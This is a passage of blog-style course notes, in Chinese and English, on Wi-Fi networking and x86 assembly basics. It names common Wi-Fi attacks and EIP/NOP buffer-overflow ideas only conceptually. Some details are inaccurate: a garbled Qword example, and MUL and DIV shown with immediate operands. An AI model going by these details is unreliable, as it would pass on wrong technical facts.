Access with Collision Avoidance 载波侦听多路访问，避免碰撞）来管理共享介质的访问。</li>\n<li>通过发送 ACK 确认包来验证每次传输，虽然这种方法需要比 802.3 更多的开销，但可提高数据传输的可靠性。</li>\n</ul>\n</li>\n<li>RTS/CTS 协议：\n<ul>\n<li>RTS/CTS（equest to Send/Clear to Send) 请求发送 / 清除发送）协议用于防止其他传输干扰数据包的传输。</li>\n<li>虽然 RTS/CTS 会降低网络的整体效率，但在处理较大数据包的传输时，这一协议能有效提高传输稳定性。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/91de5cb0eb9ecd6e.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Association and Wireless Topologies\" class=\"active\"><a class=\"anchor\"  href=\"#Association and Wireless Topologies\">#</a>Association and Wireless Topologies</h2>\n<ol>\n<li>在无线网络中，关联（Association） 是指计算机与接入点（AP）之间交换数据包的过程，以便连接到互联网。扫描（Scanning）是无线设备寻找接入点的过程。扫描分为主动扫描（Active Scanning） 和被动扫描（Passive Scanning）：\n<ul>\n<li>主动扫描：无线客户端主动发送一个探测帧（Probe）寻找 AP。</li>\n<li>被动扫描：AP 主动发送信号（Beacon 帧），客户端监听此信号。</li>\n<li>SSID（服务集标识符） 是识别接入点的唯一字符字符串，包含在信标帧中。建议用户更改默认 SSID 以增强安全性。</li>\n</ul>\n</li>\n<li>无线拓扑类型</li>\n</ol>\n<ul>\n<li>IEEE 定义了几种常见的无线拓扑结构：\n<ol>\n<li>IBSS（独立基本服务集 Independent basic service set）：使用临时（ad hoc topology）拓扑结构，少量节点直接传输数据，不通过中间连接设备。</li>\n<li>BSS（基本服务集 basic service set）：使用基础设施（infrastructure topology）拓扑结构，一组站点共享一个 AP，组内节点的标识符称为 BSSID。</li>\n<li>ESS（扩展服务集 extended service set）：使用网状（mesh topology）拓扑结构，多个 AP 连接到同一个局域网（LAN），由无线局域网控制器管理。属于同一 ESS 的客户端共享一个特殊的标识符 ESSID，这使得用户可以在不同 AP 之间漫游。</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"IEEE 802.11 Frames\" class=\"active\"><a class=\"anchor\"  href=\"#IEEE 802.11 Frames\">#</a>IEEE 802.11 Frames</h2>\n<ul>\n<li>在 IEEE 802.11 标准中，MAC 子层的帧类型被分为三大类：\n<ol>\n<li>管理帧（Management frames）：用于关联和重新关联的操作，帮助无线设备连接到接入点。</li>\n<li>控制帧（Control frames）：控制信道访问和数据传输。这些帧用于确保无线信道的有效使用，常见的控制帧有 ACK（确认）和 RTS/CTS（请求发送 / 清除发送）帧。</li>\n<li>数据帧（Data frames）：承载无线设备之间传输的实际数据内容。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/60ecf525d49f32c3.png\" alt=\"image\"><br>\n 如图所示，802.11 和 802.3（以太网 II）帧的结构不同，802.11 帧包括更多的地址字段和用于无线传输的其他控制信息。</li>\n</ol>\n</li>\n</ul>\n<h1 id=\"Wi-Fi Network\" class=\"active\"><a class=\"anchor\"  href=\"#Wi-Fi Network\">#</a>Wi-Fi Network</h1>\n<h2 id=\"Implementing a Wi-Fi Network\" class=\"active\"><a class=\"anchor\"  href=\"#Implementing a Wi-Fi Network\">#</a>Implementing a Wi-Fi Network</h2>\n<ol>\n<li>Determine the Design</li>\n</ol>\n<ul>\n<li>设计小型办公室或家庭网络（SOHO 网络）时，通常只需要一个接入点（AP）。该 AP 设备通常整合了交换、路由等网络功能，可以将无线客户端连接到局域网（LAN），并作为互联网网关。此外，许多家庭或办公室网络包括物联网（IoT）设备，例如健康监测器、智能音箱、智能恒温器、智能门铃、安全摄像头和智能冰箱等。<br>\n在决定安装 AP 的位置时，需要考虑以下因素：\n<ul>\n<li>距离：确保 AP 的信号能够覆盖预期的范围。</li>\n<li>障碍物的类型和数量：建筑物的结构和材料可能会影响信号传输。</li>\n<li>覆盖范围：要保证整个空间内都有足够的信号强度。</li>\n<li>干扰：其他无线网络或设备可能会干扰信号。</li>\n</ul>\n</li>\n<li>对于较大的无线局域网（WLAN），需要更系统地布置 AP，可以进行现场调查，以评估客户端需求、设施特点和覆盖区域，确保在给定区域内提供可靠的无线连接。<br>\n详细的现场调查可能包括：\n<ul>\n<li>研究建筑图纸：识别潜在的障碍物。</li>\n<li>Wi-Fi 无线桥接需求：确定是否需要使用 Wi-Fi 接入点作为无线桥接，以便为远程有线网络提供接入。</li>\n<li>多楼层 AP 需求：确定是否需要为特定楼层安装多个 AP。</li>\n<li>测量其他 WLAN 的信号覆盖和强度：避免信号冲突和干扰。</li>\n<li>测试建议的 AP 位置：确保信号覆盖整个预期区域。</li>\n<li>远距离测试：从空间的最远角落测试无线接入。</li>\n<li>考虑环境中的材料：某些材料会影响无线信号传播。</li>\n<li>无线和有线网络的整合：考虑如何将 LAN 的无线部分与有线部分集成。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Configure<br>\n 在配置 Wi-Fi 连接设备和客户端时，可以选择不同的无线标准、天线强度和其他功能。以下是关键的配置要点：</li>\n</ol>\n<ul>\n<li>配置 Wi-Fi 连接设备<br>\n APs vary in which wireless standards they support, their antenna strength, and other features\n<ul>\n<li>管理员密码：为 AP 设置一个强密码，以防止未经授权的访问。</li>\n<li>SSID 及其广播：配置服务集标识符（SSID）并决定是否广播 SSID。</li>\n<li>安全选项：选择适当的加密协议（例如 WPA2）以确保网络安全。</li>\n<li>DHCP 设置：决定是否启用动态主机配置协议（DHCP）来自动分配 IP 地址。</li>\n<li>故障恢复：如果配置出错，可以强制重置 AP，将所有更改恢复为默认值。</li>\n</ul>\n</li>\n<li>配置 Wi-Fi 客户端<br>\n Configuration varies from one client type to another\n<ul>\n<li>自动检测 SSID：如果 AP 正在广播 SSID，附近的客户端设备会检测到，并提示用户选择连接。</li>\n<li>设备上架（On-boarding）：安装特定应用或程序以允许设备访问网络的特定部分。</li>\n<li>设备下架（Off-boarding）：移除设备上的特殊权限应用，并且在设备丢失或被盗的情况下，管理员可以通过远程擦除 (remote wipe) 功能保护网络安全。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Wi-Fi Network Security\" class=\"active\"><a class=\"anchor\"  href=\"#Wi-Fi Network Security\">#</a>Wi-Fi Network Security</h2>\n<ol>\n<li>Wi-Fi 网络安全</li>\n</ol>\n<ul>\n<li>认证 (Authentication)：客户端可以通过 SSID 密码或用户凭据登录网络。\n<ul>\n<li>MAC 过滤 (MAC filtering)：限制未授权设备的接入。</li>\n</ul>\n</li>\n<li>加密算法 (Encryption algorithms)：使用加密算法将数据转换为不可轻易读取的格式，以防信号被拦截。</li>\n</ul>\n<ol start=\"2\">\n<li>WPA（Wi-Fi Protected Access）<br>\n一种无线网络安全协议，主要特点如下：</li>\n</ol>\n<ul>\n<li>动态密钥分配：WPA 会为每次传输动态分配一个独立的密钥，以提高数据传输的安全性。</li>\n<li>TKIP（临时密钥完整性协议 Temporal Key Integrity Protocol）：在 802.11i 标准中，WPA 引入了 TKIP 作为加密密钥生成和管理方案，以增强基于旧 WEP 设备的安全性。TKIP 带来了以下改进：\n<ul>\n<li>消息完整性：确保数据在传输过程中未被篡改。</li>\n<li>密钥分发：为每个数据包生成一个唯一的加密密钥，防止密钥重用。</li>\n<li>加密：提升数据的加密安全性，相比于 WEP 更加难以破解。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>WPA2（Wi-Fi Protected Access, Version 2）<br>\nWPA 的增强版本，采用更强的数据保密方法来保护无线网络安全。其主要特点包括：</li>\n</ol>\n<ul>\n<li>CCMP 协议：WPA2 使用 CCMP（计数器模式结合 CBC (Cipher Block Chaining) MAC (Message Authentication Code) 协议）来确保数据的保密性。CCMP 提供了以下安全功能：\n<ul>\n<li>消息完整性：通过验证传入数据包的来源，确保数据来自声明的源，从而防止数据被篡改。</li>\n<li>加密：使用 AES（Advanced Encryption Standard 高级加密标准）进行加密。AES 相比 TKIP 提供了更快且更安全的加密方式，提高了数据的安全性。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Other Security Configurations</li>\n</ol>\n<ul>\n<li>Additional security options include the following:\n<ul>\n<li>AP and antenna placement</li>\n<li>Geofencing</li>\n<li>Guest network</li>\n<li>Wireless client isolation</li>\n<li>Captive portal</li>\n<li>IoT access considerations</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>Security Threats to Wi-Fi Networks</li>\n</ol>\n<ul>\n<li>War Driving：黑客通过驾驶装有无线数据接收设备的笔记本电脑在各地巡查，以发现未保护的无线网络，并尝试截获无线数据传输。</li>\n<li>War Chalking：黑客在易受攻击的 AP（接入点）附近的墙上或人行道上用粉笔画符号，告知其他黑客该位置的漏洞。</li>\n<li>Evil Twin：在网络的地理区域内设置一个伪装的 AP，以假装是授权的 AP，从而诱骗用户连接到该恶意 AP。</li>\n<li>WPA Attack：通过拦截 AP 与设备之间传输的网络密钥来破解 WPA 安全协议的攻击，也被称为 WPA 破解。</li>\n<li>WPS Attack：利用暴力破解的方式来破解 WPS 的 PIN 码，从而访问 AP 的设置。WPS PIN 容易被暴力破解，使其成为一个较为脆弱的安全点。</li>\n</ul>\n<ol start=\"6\">\n<li>Wi-Fi Network Tools</li>\n</ol>\n<ul>\n<li>Two types of software tools you should have:\n<ul>\n<li>Spectrum analyzer – a device that can assess the quality of the wireless signal</li>\n<li>Wireless analyzer (Wi-Fi analyzer) – software that can evaluate Wi-Fi network availability, optimize Wi-Fi signal settings, and help identify Wi-Fi security threats</li>\n</ul>\n</li>\n<li>List of capabilities common to wireless testing tools:\n<ul>\n<li>Identify transmitting access points, stations, and channels</li>\n<li>Measure signal strength from an AP</li>\n<li>Indicate the effects of attenuation, signal loss, and noise</li>\n<li>Interpret signal strength information</li>\n<li>Ensure proper association and reassociation between APs</li>\n<li>Capture and interpret traffic</li>\n<li>Measure throughput and assess data transmission errors</li>\n<li>Analyze characteristics of each channel</li>\n</ul>\n</li>\n</ul>\n<ol start=\"7\">\n<li>Avoid Pitfalls</li>\n</ol>\n<ul>\n<li>The following lists some wireless configuration pitfalls to avoid</li>\n<li>No connection – when you cant get the Wi-Fi client to connect to the AP:\n<ul>\n<li>Wrong SSID</li>\n<li>Encryption protocol mismatch</li>\n<li>Incorrect passphrase</li>\n<li>Static channel utilization</li>\n<li>Mismatched RF band</li>\n<li>Mismatched standards</li>\n<li>Long AP association time</li>\n</ul>\n</li>\n<li>Slow connections – when dealing with slow Wi-Fi connections:\n<ul>\n<li>Insufficient wireless coverage</li>\n<li>RF attenuation/signal loss</li>\n<li>Interference</li>\n<li>Channel overlap</li>\n<li>Wireless standard specifications</li>\n<li>Simultaneous wired and wireless connections</li>\n<li>Problems with firmware updates</li>\n<li>Incorrect antenna type</li>\n<li>Mismatched antenna polarization</li>\n<li>Client saturation or overcapacity</li>\n<li>Client disassociation issues</li>\n</ul>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","Wi-Fi","WLANs"]},{"title":"x86 architecture and Assembly basics","url":"/course/x86-architecture-and-Assembly-basics/","content":"<h1 id=\" x86 architecture\" class=\"active\"><a class=\"anchor\"  href=\"# x86 architecture\">#</a> x86 architecture</h1>\n<h2 id=\"Levels of Abstraction\" class=\"active\"><a class=\"anchor\"  href=\"#Levels of Abstraction\">#</a> Levels of Abstraction</h2>\n<p>抽象层次（Levels of Abstraction） 是指在计算机系统设计中，将复杂的系统分解为不同的层次，以便于理解、设计和实现。每个抽象层都基于更底层的层次，同时也为更高层次提供基础。这种层次化的设计方式使得复杂系统的开发和维护更加高效。以下是这些抽象层次的具体解释：</p>\n<ol>\n<li>硬件层（Hardware Level）<br>\n解释：这是最底层的抽象层，主要是由各种电子电路和逻辑门（如 XOR、AND、OR、NOT 门等）组成。这些电路实现了最基本的逻辑运算和数据处理，是计算机所有功能的基础。<br>\n特点：这一层是最接近物理硬件的，直接处理电信号和物理开关状态。</li>\n<li>微码层（Microcode Level）/ 固件层（Firmware Level）<br>\n解释：微码（或固件）是一种嵌入在硬件中的特殊程序，用来解释机器指令并控制底层硬件的操作。它位于硬件和机器码之间。<br>\n特点：微码作为硬件与机器码的桥梁，是指令执行的控制逻辑，可以在不改变硬件的情况下更新或调整计算机的功能。</li>\n<li>机器码层（Machine Code Level）<br>\n解释：机器码是计算机直接执行的二进制代码，通常以操作码（opcodes）和十六进制数字形式表示。它由一系列低级指令组成，用于控制计算机的处理器执行任务。<br>\n特点：机器码是最底层的可编程语言，只有计算机可以直接执行，由处理器按照指令执行具体操作。</li>\n<li>低级语言层（Low-Level Languages Level）<br>\n解释：低级语言是机器码的人类可读版本，例如汇编语言（Assembly Language）。它使用助记符（如 MOV、ADD、JMP 等）来代表机器指令，更易于编程和调试。<br>\n特点：低级语言紧密对应计算机的硬件结构，编程者需要了解具体的计算机架构，适合编写操作系统、驱动程序和嵌入式系统。</li>\n<li>高级语言层（High-Level Languages Level）<br>\n解释：高级语言（如 C、C++、Java 等）提供了更抽象、更人性化的语法和结构，使得编程者可以更轻松地编写复杂的程序。这些语言中的代码通过编译器转换成机器码。<br>\n特点：高级语言通常具有良好的跨平台性和可移植性，编程效率高，适合开发应用程序和大型软件系统。</li>\n<li>解释型语言层（Interpreted Languages Level）<br>\n解释：解释型语言（如 Python、JavaScript）不是直接编译成机器码，而是先被翻译成字节码，然后在解释器中执行。<br>\n特点：解释型语言更灵活，适合快速开发和原型设计，但执行速度通常比编译型语言慢。</li>\n<li>字节码层（Bytecode Level）<br>\n解释：字节码是高级语言在被解释执行之前的中间形式。解释器将字节码翻译为机器可以执行的指令。<br>\n特点：字节码的设计通常与硬件无关，可以在不同的平台上被相同的解释器执行，例如 Java 和 Python 的虚拟机（JVM、Python Interpreter）都使用字节码。</li>\n</ol>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/25/671b4d8733f64.png\" alt=\"img\"></p>\n<h2 id=\"Assembly\" class=\"active\"><a class=\"anchor\"  href=\"#Assembly\">#</a> Assembly</h2>\n<ol>\n<li>汇编语言（Assembly Language） 是一种低级编程语言，它与计算机的机器码有着一一对应的关系，并且比机器码更易于人类理解和编写。以下是对汇编语言及相关概念的详细中文解释：</li>\n</ol>\n<ul>\n<li>汇编语言的定义<br>\n汇编语言是最接近机器码的高级语言，它可以将机器指令用人类可读的助记符（如 MOV、ADD、JMP 等）来表示。这使得程序员能够直接控制硬件，同时比直接编写二进制代码更加方便。</li>\n<li>与机器码的关系<br>\n汇编语言是最可靠的、可以从机器码中恢复的高级语言。如果高层语言的源代码不可用时，通过反汇编（disassembly），可以将机器码转换回对应的汇编代码。<br>\n汇编语言和机器码之间的对应关系使得程序员可以清楚地了解计算机底层的执行逻辑和流程。</li>\n<li>脆弱代码和恶意软件的存储形式<br>\n在内存或磁盘中，脆弱代码或恶意软件通常以二进制形式（即机器码）存储。这种形式是计算机直接执行的代码，但对人类而言不可读。</li>\n<li>反汇编器的作用<br>\n反汇编器是一种工具，它以二进制代码为输入，并将其翻译成相应的汇编代码输出。通过反汇编，可以将机器码还原为人类可读的汇编语言，有助于分析和调试程序，特别是在逆向工程或安全分析中。</li>\n<li>汇编语言是多种语言的集合<br>\n汇编语言实际上是多种语言的集合，因为不同的计算机架构（如 x86、ARM、MIPS 等）有各自独特的指令集和汇编语言格式。<br>\n在学习和使用汇编语言时，通常会针对特定的计算机架构进行深入研究。例如，x86 汇编和 ARM 汇编在指令集、寄存器使用和指令格式上都有明显的不同。</li>\n</ul>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/25/671b4f21f3929.png\" alt=\"img\"><br>\n 整个过程从汇编语言（asm 文件）开始，通过汇编器生成目标文件，再通过链接器将目标文件和库文件结合生成可执行文件，最后将可执行文件加载到内存中运行</p>\n<ul>\n<li>汇编器（Assembler）<br>\n汇编器的作用是将汇编语言的代码（asm 文件）翻译成目标文件（object file）。目标文件是二进制形式的文件，包含了机器可以理解的指令和数据，但还不是完整的可执行程序。</li>\n<li>链接器（Linker）<br>\n链接器的作用是将多个目标文件和库文件（如静态库或动态库）组合起来，生成一个完整的可执行文件（Executable）。<br>\n静态库（Static Library）：静态库中的代码在编译期间直接被链接到可执行文件中。<br>\n动态库（Dynamic Library）：动态库中的代码在运行时被加载到内存中。</li>\n</ul>\n<ol start=\"2\">\n<li>Assembler vs. Compiler</li>\n</ol>\n<ul>\n<li>编译器 (Compiler) vs. 汇编器 (Assembler)<br>\n 编译器：将高级编程语言的代码（如 C、C++、Java 等）转换为机器级代码。<br>\n汇编器：将汇编语言的代码转换为机器级代码。</li>\n<li>输入<br>\n编译器：以高级语言的源代码为输入。<br>\n汇编器：以汇编语言的代码为输入。</li>\n<li>转换方式<br>\n编译器：会检查并一次性将整个代码转换为机器代码。<br>\n汇编器：一般不一次性转换完整代码，而是分两步处理。</li>\n<li>内部模块<br>\n编译器：包含词法分析器、语法分析器、语义分析器、代码优化器和代码生成器等模块。(lexical analyzer, Syntax analyzer, Semantic analyzer, Code optimizer, Code generator)<br>\n 汇编器：在两次扫描中完成所有工作。</li>\n<li>输出结果<br>\n编译器：输出的是机器代码的助记符 (Mnemonic) 版本。<br>\n汇编器：输出的是机器代码的二进制版本。</li>\n<li>常见类型<br>\n编译器：如 C、C++、Java 的编译器。<br>\n汇编器：如 GAS（GNU Assembler）、GNU 汇编器</li>\n</ul>\n<ol start=\"3\">\n<li>Two main forms of assembly syntax</li>\n</ol>\n<ul>\n<li>NASM format: <instr> <dest>, <source> &lt;; comment&gt; : mov eax, 10</li>\n<li>AT&amp;T format:  <instr> <source>, <dest> &lt;# comment&gt;: mov $10, %eax<br>\nAT&amp;T format reverses the order of operands, uses a % before registers and a $ before literal values</li>\n</ul>\n<ol start=\"4\">\n<li>Fundamental Data Types</li>\n</ol>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/25/671b528c52025.png\" alt=\"img\"></p>\n<ul>\n<li>\n<p>Byte（字节）<br>\n大小：1 字节 = 8 位（bit）。<br>\n示例：图中展示的 5D 是一个 8 位的二进制数（01011101），它可以用一个字节来表示。<br>\n解释：一个字节的二进制位可以表示 0 到 255 之间的整数（无符号），或 -128 到 127 之间的整数（有符号）。</p>\n</li>\n<li>\n<p>Word（字）<br>\n大小：2 字节 = 16 位（bit）。<br>\n示例：图中展示的 8BEC 表示一个 16 位的二进制数，其中：<br>\n高字节（High Byte）：8B<br>\n 低字节（Low Byte）：EC<br>\n 解释：一个 Word 可以表示 0 到 65535 之间的无符号整数，或 -32768 到 32767 之间的有符号整数。</p>\n</li>\n<li>\n<p>Dword（双字）<br>\n大小：4 字节 = 32 位（bit）。<br>\n示例：图中展示的 000136CF 表示一个 32 位的二进制数，其中：<br>\n高字（High Word）：0001<br>\n 低字（Low Word）：36CF<br>\n 解释：一个 Dword 可以表示更大的整数范围，用于存储更大的数值或内存地址。</p>\n</li>\n<li>\n<p>Qword（四字）<br>\n大小：8 字节 = 64 位（bit）。<br>\n示例：图中展示的 CF000136CF 表示一个 64 位的二进制数，其中：<br>\n高双字（High Dword）：CF00<br>\n 低双字（Low Dword）：0136CF<br>\n 解释：一个 Qword 可以表示更大的整数或浮点数范围，常用于 64 位处理器上的运算。</p>\n</li>\n<li>\n<p>Data in Memory<br>\nLittle-endian format: a low-order byte is stored at the lower address<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/25/671b538e3e57f.png\" alt=\"img\"></p>\n</li>\n</ul>\n<h2 id=\"CPU Registers\" class=\"active\"><a class=\"anchor\"  href=\"#CPU Registers\">#</a>CPU Registers</h2>\n<ol>\n<li>CPU 寄存器是 CPU 内部的一小部分数据存储单元，用于暂存指令、数据和状态信息。寄存器是 CPU 中速度最快的存储单元，比其他存储设备（如 RAM、硬盘）快得多，因为它们位于 CPU 内部，能够快速读写数据。<br>\nCPU 寄存器的类型</li>\n</ol>\n<ul>\n<li>通用寄存器（General Registers）<br>\n用途：在程序执行期间由 CPU 使用，用于存储数据、操作数和临时结果。<br>\n功能：可以用于整数运算、地址运算和数据的传输，是最常用的寄存器类型。</li>\n<li>段寄存器（Segment Registers）<br>\n用途：用于管理和跟踪内存的不同段（如代码段、数据段和栈段）。<br>\n功能：帮助 CPU 确定内存访问的具体区域，使得内存分段管理更加高效。</li>\n<li>状态标志（Status Flags）<br>\n用途：存储程序执行的状态信息，例如运算结果是正、负、零，或是否发生溢出等。<br>\n功能：在 CPU 进行条件判断或决策时提供必要的信息支持，决定程序的执行路径。</li>\n<li>指令指针（Instruction Pointers）<br>\n用途：用于跟踪下一条将要执行的指令的地址。<br>\n功能：确保程序的指令按顺序执行，是控制程序流程的关键寄存器。</li>\n</ul>\n<ol start=\"2\">\n<li>x86 Registers\n<ol>\n<li>数据寄存器（Data Registers）\n<ul>\n<li>EAX（累加器）：主要用于输入 / 输出和大多数算术运算。例如，加法、减法、乘法和除法操作时，通常会用到 EAX。</li>\n<li>EBX（基址寄存器）：可用于索引寻址模式，即在访问数组或结构中的元素时，EBX 可以作为基址寄存器使用。</li>\n<li>ECX（计数寄存器）：在循环操作中存储循环计数，通常用于实现迭代操作。</li>\n<li>EDX（数据寄存器）：也用于输入 / 输出操作，有时与 AX 一起使用，例如在某些乘法和除法运算中。</li>\n</ul>\n</li>\n<li>索引寄存器（Index Registers）\n<ul>\n<li>ESI（源索引）：用于字符串操作的源索引，通常在数据的读取操作中使用。</li>\n<li>EDI（目标索引）：用于字符串操作的目标索引，通常在数据的写入操作中使用。</li>\n</ul>\n</li>\n<li>段寄存器（Segment Registers）\n<ul>\n<li>CS（代码段寄存器）：指向包含所有将要执行的指令的代码段。</li>\n<li>DS（数据段寄存器）：指向包含全局数据、常量和工作区的数据段。</li>\n<li>SS（栈段寄存器）：指向包含局部数据和过程或子程序返回地址的栈段。</li>\n<li>其他段寄存器（ES、FS、GS）：提供额外的数据存储段，用于存放其他类型的数据。<br>\n在段内的所有内存位置都相对于段的起始地址。</li>\n</ul>\n</li>\n<li>状态寄存器（Status Register）\n<ul>\n<li>EFLAGS 寄存器：用于存储处理器的状态标志，每个标志位表示不同的状态或条件：</li>\n<li>ZF（零标志）：当运算结果为零时设置。</li>\n<li>CF（进位标志）：当运算结果过大或过小时设置。</li>\n<li>SF（符号标志）：当运算结果为负时设置。</li>\n<li>TF（陷阱标志）：用于调试，设置该标志时，处理器一次只执行一条指令。通常被调试工具（如 GDB）使用。</li>\n</ul>\n</li>\n<li>指令指针（Instruction Pointer, EIP）也称为程序计数器，它包含下一条将被执行的指令的偏移地址。\n<ul>\n<li>EIP 的唯一目的是告诉处理器下一步要执行什么指令。</li>\n<li>当前指令的完整地址为 CS:EIP（代码段寄存器加指令指针）。</li>\n<li>如果攻击者能够控制 EIP，他们就能控制 CPU 的执行流程，因此 EIP 是常见攻击（如缓冲区溢出）的目标。</li>\n</ul>\n</li>\n<li>其他指针寄存器（Other Pointer Registers）\n<ul>\n<li>ESP（栈指针寄存器）：提供程序栈中的偏移值，SS:ESP 表示栈顶（当前数据或地址在程序栈中的位置）。</li>\n<li>EBP（基址指针寄存器）：主要用于引用传递给子程序的参数变量（如函数调用）。SS:EBP 表示当前调用的栈帧 (stack frame)。</li>\n</ul>\n</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"Assembly basics\" class=\"active\"><a class=\"anchor\"  href=\"#Assembly basics\">#</a> Assembly basics</h1>\n<h2 id=\"Simple Instructions\" class=\"active\"><a class=\"anchor\"  href=\"#Simple Instructions\">#</a>Simple Instructions</h2>\n<ol>\n<li>mov instruction</li>\n</ol>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/25/671b589f37dc7.png\" alt=\"img\"></p>\n<p>lea (load effective address) instruction puts a memory address into the<br>\ndestination</p>\n<ul>\n<li>e.g. lea eax, [ebx+8] puts EBX+8 into EAX</li>\n<li>e.g. mov eax, [ebx+8] loads the data at the memory address EBX+8</li>\n</ul>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/25/671b595145504.png\" alt=\"img\"></p>\n<ul>\n<li>mov eax, [ebx+8] places the value 0x20 into EAX</li>\n<li>lea eax, [ebx+8] places the value 0xB30048 into EAX</li>\n</ul>\n<ol start=\"2\">\n<li>Arithmetic</li>\n</ol>\n<ul>\n<li>sub eax, 0x10<br>\n 描述：从寄存器 EAX 中减去 0x10（十六进制的 16）。<br>\n结果：EAX 的值减少 16。</li>\n<li>add eax, ebx<br>\n 描述：将寄存器 EBX 的值加到 EAX 中，并将结果存储在 EAX 中。<br>\n结果：EAX = EAX + EBX。</li>\n<li>inc edx<br>\n 描述：将寄存器 EDX 的值加 1。<br>\n结果：EDX 的值增加 1。</li>\n<li>dec ecx<br>\n 描述：将寄存器 ECX 的值减 1。<br>\n结果：ECX 的值减少 1。</li>\n<li>mul 0x50<br>\n 描述：将寄存器 EAX 的值乘以 0x50（十六进制的 80），并将结果存储在 EDX<br>\n 中。<br>\n结果：EAX 中存储低 32 位的乘积，EDX 中存储高 32 位的乘积。</li>\n<li>div 0x75<br>\n 描述：用寄存器 EDX<br>\n（将 EDX 和 EAX 结合起来，表示 64 位的数值）除以 0x75（十六进制的 117）。<br>\n结果：商存储在 EAX 中，余数存储在 EDX 中。</li>\n</ul>\n<ol start=\"3\">\n<li>Logics</li>\n</ol>\n<ul>\n<li>xor eax, eax<br>\n 描述：将寄存器 EAX 和自身进行异或操作，清除 EAX 中的值（即将 EAX 置为 0）。<br>\n结果：EAX = 0。</li>\n<li>or eax, 0x7575<br>\n 描述：对 EAX 寄存器和 0x7575 进行逻辑或（OR）操作。<br>\n结果：EAX 的每个位都与 0x7575 的相应位进行或操作。</li>\n<li>mov eax, 0xA 和 shl eax, 2<br>\nmov eax, 0xA：将 EAX 设置为 0xA（十六进制的 10）。<br>\nshl eax, 2：将 EAX 寄存器中的值左移 2 位。<br>\n结果：EAX 的值变为 0x28（十六进制的 40），因为二进制的 1010 左移 2 位变为 101000。</li>\n<li>mov bl, 0xA 和 ror bl, 2<br>\nmov bl, 0xA：将 BL 设置为 0xA（十六进制的 10）。<br>\nror bl, 2：将 BL 寄存器中的值右旋 2 位。<br>\n结果：BL 的值变为 10000010，因为二进制的 1010 右旋 2 位变为 10000010。</li>\n</ul>\n<ol start=\"4\">\n<li>nop<br>\n 描述：NOP 指令不执行任何操作，仅仅让处理器继续执行下一条指令。<br>\n作用：NOP 实际上是 xchg eax, eax 的伪指令，因为将 EAX 与自身交换不会改变任何值。<br>\n用途：在缓冲区溢出攻击中，攻击者常使用 NOP 指令来填充攻击代码，使得执行具有一定的缓冲空间。NOP 的操作码是 0x90。</li>\n</ol>\n<h2 id=\"The Stack\" class=\"active\"><a class=\"anchor\"  href=\"#The Stack\">#</a>The Stack</h2>\n<ol>\n<li>栈的基本概念<br>\n栈 是一种 后进先出（LIFO） 的数据结构，这意味着最后放入的数据将是第一个被取出的。<br>\n栈通常用于存储函数调用的参数、局部变量、返回地址和一些控制信息。<br>\n栈的主要寄存器包括：<br>\nESP（栈指针）：指向当前栈顶。<br>\nEBP（基址指针）：跟踪局部变量和函数参数的位置。</li>\n<li>栈指令<br>\n栈操作包括以下几种常见指令：</li>\n</ol>\n<ul>\n<li>push：将数据压入栈中，ESP 会减少（栈向下增长）。</li>\n<li>pop：从栈中弹出数据，ESP 会增加。</li>\n<li>call：调用函数，将当前指令的地址压入栈中，并跳转到指定函数的位置。</li>\n<li>leave：用于函数返回时，将栈恢复到调用者的状态。</li>\n<li>enter：为新函数栈帧分配空间，保存当前的 EBP，并更新 EBP 为新栈帧的起始位置。</li>\n<li>ret：函数返回，将栈顶的返回地址弹出到 EIP 中，恢复程序的执行。</li>\n</ul>\n<ol start=\"3\">\n<li>函数调用的栈操作<br>\n在函数调用过程中，栈的使用通常按照以下步骤进行：</li>\n</ol>\n<ul>\n<li>参数入栈：使用 push 指令将函数的参数依次压入栈中。</li>\n<li>调用函数：使用  <code>call &lt;location&gt;</code>  指令调用函数。当前指令地址（EIP）会被压入栈中，便于函数执行完毕后返回。EIP 将被设置为函数的起始地址（ <code>&lt;location&gt;</code> ）。</li>\n<li>保存局部变量和 EBP：函数调用后，局部变量和调用者的 EBP 被压入栈中，用于为新函数栈帧分配空间。</li>\n<li>执行函数：函数内部执行具体的任务，包括访问局部变量、处理逻辑和修改数据。</li>\n<li>恢复局部变量和调用者的 EBP：使用 leave 指令，将 EBP 和局部变量恢复为调用者的状态。</li>\n<li>恢复 EIP：使用 ret 指令，将栈顶的返回地址弹出到 EIP 中，以继续执行调用函数的程序。</li>\n<li>清理参数：参数在函数返回后可能需要被清理，从而恢复栈的平衡状态。</li>\n</ul>\n<p><img data-src=\"https://img.picui.cn/free/2024/10/25/671b64bb0713f.png\" alt=\"img\"></p>\n<h2 id=\"Conditionals and Branching\" class=\"active\"><a class=\"anchor\"  href=\"#Conditionals and Branching\">#</a>Conditionals and Branching</h2>\n<ol>\n<li>条件指令（Conditionals）\n<ol>\n<li>test 指令</li>\n</ol>\n<ul>\n<li>功能：test 指令类似于逻辑与（AND）操作，但不会修改操作数，只用于设置标志位。</li>\n<li>标志位：主要设置 ZF（零标志）。如果操作数之间的逻辑与结果为零，则 ZF 被置 1，否则置 0。</li>\n<li>用法：通常用于检查某个位是否被设置，例如判断一个变量是否为零或检测特定位是否为 1。</li>\n</ul>\n<ol start=\"2\">\n<li>cmp 指令</li>\n</ol>\n<ul>\n<li>功能：cmp 指令类似于减法（SUB）操作，但不会改变操作数的值，只用于设置标志位。</li>\n<li>标志位：主要设置 ZF（零标志） 和 CF（进位标志）。</li>\n<li>ZF（零标志）：当两个操作数相等时，ZF 被置 1。</li>\n<li>CF（进位标志）：当目标操作数小于源操作数时，CF 被置 1。</li>\n<li>用法：通常用于比较两个数值大小，以决定下一步的条件跳转。</li>\n</ul>\n<ol 